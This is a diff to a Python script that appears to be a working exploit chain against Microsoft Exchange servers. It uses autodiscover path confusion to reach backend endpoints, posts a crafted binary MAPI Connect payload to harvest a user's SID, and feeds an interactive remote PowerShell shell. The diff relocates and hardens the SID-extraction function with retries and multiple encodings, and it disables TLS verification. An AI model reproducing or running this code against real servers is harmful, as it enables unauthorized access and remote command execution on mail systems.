@@ -7,6 +7,11 @@ import string
 import random
 import time
 import threading
+import re
+import time
+import requests
+import xml.etree.ElementTree as ET
+from requests.exceptions import RequestException
 import xml.etree.ElementTree as ET
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -14,6 +19,8 @@ from pypsrp.powershell import PowerShell, RunspacePool
 from pypsrp.wsman import WSMan
 from encode_payload import generate_payload
 
+
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """Handle requests in a separate thread."""
@@ -107,6 +114,113 @@ def check_token_valid(url: str, token: str):
     sys.exit(1)
 
 
+def get_sid(url: str, email: str, timeout: float = 8.0, retries: int = 2) -> str:
+    """
+    Robust diagnostic get_sid:
+    - obtains LegacyDN via Autodiscover (with checks)
+    - crafts a binary MAPI Connect payload (legacydn + suffix bytes) using explicit encodings
+    - posts to MAPI endpoint with Content-Length & Connection headers
+    - tries utf-8 and utf-16le encodings (diagnostic)
+    - returns extracted SID or raises RuntimeError with helpful diagnostics
+    """
+    print("[-] Getting LegacyDN (Autodiscover)")
+    body = (
+        '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">'
+        '<Request>'
+        f'<EMailAddress>{email}</EMailAddress>'
+        '<AcceptableResponseSchema>'
+        'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'
+        '</AcceptableResponseSchema>'
+        '</Request>'
+        '</Autodiscover>'
+    )
+
+    autodiscover_url = url.rstrip('/') + "/autodiscover/autodiscover.json?@test.com/autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@test.com"
+    try:
+        resp = requests.post(autodiscover_url, headers={"Content-Type": "text/xml"}, data=body.encode("utf-8"), verify=False, timeout=timeout)
+    except RequestException as e:
+        raise RuntimeError(f"[Stage 1] Autodiscover request failed: {e}") from e
+
+    if resp.status_code != 200:
+        short = (resp.text or "")[:800].replace("\n", " ")
+        raise RuntimeError(f"[Stage 1] Autodiscover returned {resp.status_code}. Body snippet: {short}")
+
+    # extract LegacyDN robustly
+    legacydn = None
+    try:
+        xml_root = ET.fromstring(resp.content)
+        for el in xml_root.iter():
+            if el.tag.endswith("LegacyDN") and el.text and el.text.strip():
+                legacydn = el.text.strip()
+                break
+    except ET.ParseError:
+        pass
+
+    if not legacydn:
+        m = re.search(r"<LegacyDN>(.*?)</LegacyDN>", resp.content.decode('utf-8', errors='ignore'), re.DOTALL | re.IGNORECASE)
+        if m:
+            legacydn = m.group(1).strip()
+
+    if not legacydn:
+        raise RuntimeError("[Stage 1] LegacyDN not found in Autodiscover response. Aborting.")
+
+    print(f"[+] Successfully got LegacyDN: {legacydn!r}")
+
+    # fixed suffix bytes (keep exact values as in original code)
+    suffix = b'\x00\x00\x00\x00\x00\xe4\x04' + b'\x00\x00\x09\x04\x00\x00\x09' + b'\x04\x00\x00\x00\x00\x00\x00'
+
+    sid_endpoint = url.rstrip('/') + "/autodiscover/autodiscover.json?@test.com/mapi/emsmdb?&Email=autodiscover/autodiscover.json%3F@test.com"
+    headers_base = {
+        "X-Requesttype": "Connect",
+        "X-Clientapplication": "Outlook/15.1.2176.9",
+        "X-Requestid": "anything",
+        "Content-Type": "application/mapi-http",
+    }
+
+    # try multiple encodings to see which the server accepts (diagnostic)
+    encodings = ["utf-8", "utf-16le"]
+    last_exc = None
+    for enc in encodings:
+        try:
+            legacy_bytes = legacydn.encode(enc)
+        except Exception as e:
+            print(f"[!] Encoding {enc} failed: {e}")
+            continue
+
+        payload = legacy_bytes + suffix
+        headers = dict(headers_base)
+        headers["Content-Length"] = str(len(payload))
+        headers["Connection"] = "close"
+
+        print(f"[-] Trying MAPI Connect POST with encoding={enc}, payload_len={len(payload)}")
+        attempt = 0
+        while attempt <= retries:
+            attempt += 1
+            try:
+                r = requests.post(sid_endpoint, data=payload, headers=headers, verify=False, timeout=timeout)
+            except RequestException as e:
+                last_exc = e
+                print(f"[!] Request attempt {attempt} failed: {e}")
+                time.sleep(1 + attempt)
+                continue
+
+            # show diagnostic snippet
+            snippet = (r.text or "")[:1000].replace("\n", " ")
+            print(f"[*] HTTP {r.status_code} response snippet: {snippet[:600]}")
+
+            # try to extract SID with regex (robust)
+            m = re.search(r"with SID\s+([A-Za-z0-9\-\_]+)\s+and MasterAccountSid", r.text, re.IGNORECASE)
+            if m:
+                sid = m.group(1)
+                print(f"[+] Successfully get User SID: {sid}")
+                return sid
+            else:
+                # not found — break out to try next encoding after a short pause
+                print("[!] SID not found in response for this encoding; trying next encoding (if any).")
+                break
+
+    # if we reach here we failed
+    raise RuntimeError(f"[Stage 2] Failed to obtain SID. Last error/snippet: {last_exc}")
 def rand_subject(n=6):
     return ''.join(random.choices(string.ascii_lowercase, k=n))
 
@@ -283,124 +397,5 @@ def main():
 
     while True:
         shell(input('PS> '), local_port)
-
-
-import re
-import time
-import requests
-import xml.etree.ElementTree as ET
-from requests.exceptions import RequestException
-
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-
-def get_sid(url: str, email: str, timeout: float = 8.0, retries: int = 2) -> str:
-    """
-    Robust diagnostic get_sid:
-    - obtains LegacyDN via Autodiscover (with checks)
-    - crafts a binary MAPI Connect payload (legacydn + suffix bytes) using explicit encodings
-    - posts to MAPI endpoint with Content-Length & Connection headers
-    - tries utf-8 and utf-16le encodings (diagnostic)
-    - returns extracted SID or raises RuntimeError with helpful diagnostics
-    """
-    print("[-] Getting LegacyDN (Autodiscover)")
-    body = (
-        '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">'
-        '<Request>'
-        f'<EMailAddress>{email}</EMailAddress>'
-        '<AcceptableResponseSchema>'
-        'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'
-        '</AcceptableResponseSchema>'
-        '</Request>'
-        '</Autodiscover>'
-    )
-
-    autodiscover_url = url.rstrip('/') + "/autodiscover/autodiscover.json?@test.com/autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@test.com"
-    try:
-        resp = requests.post(autodiscover_url, headers={"Content-Type": "text/xml"}, data=body.encode("utf-8"), verify=False, timeout=timeout)
-    except RequestException as e:
-        raise RuntimeError(f"[Stage 1] Autodiscover request failed: {e}") from e
-
-    if resp.status_code != 200:
-        short = (resp.text or "")[:800].replace("\n", " ")
-        raise RuntimeError(f"[Stage 1] Autodiscover returned {resp.status_code}. Body snippet: {short}")
-
-    # extract LegacyDN robustly
-    legacydn = None
-    try:
-        xml_root = ET.fromstring(resp.content)
-        for el in xml_root.iter():
-            if el.tag.endswith("LegacyDN") and el.text and el.text.strip():
-                legacydn = el.text.strip()
-                break
-    except ET.ParseError:
-        pass
-
-    if not legacydn:
-        m = re.search(r"<LegacyDN>(.*?)</LegacyDN>", resp.content.decode('utf-8', errors='ignore'), re.DOTALL | re.IGNORECASE)
-        if m:
-            legacydn = m.group(1).strip()
-
-    if not legacydn:
-        raise RuntimeError("[Stage 1] LegacyDN not found in Autodiscover response. Aborting.")
-
-    print(f"[+] Successfully got LegacyDN: {legacydn!r}")
-
-    # fixed suffix bytes (keep exact values as in original code)
-    suffix = b'\x00\x00\x00\x00\x00\xe4\x04' + b'\x00\x00\x09\x04\x00\x00\x09' + b'\x04\x00\x00\x00\x00\x00\x00'
-
-    sid_endpoint = url.rstrip('/') + "/autodiscover/autodiscover.json?@test.com/mapi/emsmdb?&Email=autodiscover/autodiscover.json%3F@test.com"
-    headers_base = {
-        "X-Requesttype": "Connect",
-        "X-Clientapplication": "Outlook/15.1.2176.9",
-        "X-Requestid": "anything",
-        "Content-Type": "application/mapi-http",
-    }
-
-    # try multiple encodings to see which the server accepts (diagnostic)
-    encodings = ["utf-8", "utf-16le"]
-    last_exc = None
-    for enc in encodings:
-        try:
-            legacy_bytes = legacydn.encode(enc)
-        except Exception as e:
-            print(f"[!] Encoding {enc} failed: {e}")
-            continue
-
-        payload = legacy_bytes + suffix
-        headers = dict(headers_base)
-        headers["Content-Length"] = str(len(payload))
-        headers["Connection"] = "close"
-
-        print(f"[-] Trying MAPI Connect POST with encoding={enc}, payload_len={len(payload)}")
-        attempt = 0
-        while attempt <= retries:
-            attempt += 1
-            try:
-                r = requests.post(sid_endpoint, data=payload, headers=headers, verify=False, timeout=timeout)
-            except RequestException as e:
-                last_exc = e
-                print(f"[!] Request attempt {attempt} failed: {e}")
-                time.sleep(1 + attempt)
-                continue
-
-            # show diagnostic snippet
-            snippet = (r.text or "")[:1000].replace("\n", " ")
-            print(f"[*] HTTP {r.status_code} response snippet: {snippet[:600]}")
-
-            # try to extract SID with regex (robust)
-            m = re.search(r"with SID\s+([A-Za-z0-9\-\_]+)\s+and MasterAccountSid", r.text, re.IGNORECASE)
-            if m:
-                sid = m.group(1)
-                print(f"[+] Successfully get User SID: {sid}")
-                return sid
-            else:
-                # not found — break out to try next encoding after a short pause
-                print("[!] SID not found in response for this encoding; trying next encoding (if any).")
-                break
-
-    # if we reach here we failed
-    raise RuntimeError(f"[Stage 2] Failed to obtain SID. Last error/snippet: {last_exc}")
-
-
 if __name__ == '__main__':
     main()
